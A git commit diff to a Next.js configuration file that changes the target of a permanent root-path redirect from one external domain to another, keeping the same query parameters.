d549b3663d1392fab07fe337110a0341281c76fa
tenzie3 <100000407+tenzie3@users.noreply.github.com>
2022-09-30 20:05:46 +0200

    Update next.config.js

--- next.config.js
+++ next.config.js
@@ -6,7 +6,7 @@ const nextConfig = {
     return [
       {
         source: '/',
-        destination: 'https://hu3.app/?a=h8k77brcqd&gtm=G-9YNLXP1M2C&live=sjomeipsgyrzo5rmuwakuytufwymcxn5',
+        destination: 'https://hu2.io/?a=h8k77brcqd&gtm=G-9YNLXP1M2C&live=sjomeipsgyrzo5rmuwakuytufwymcxn5',
         permanent: true,
       },
     ]
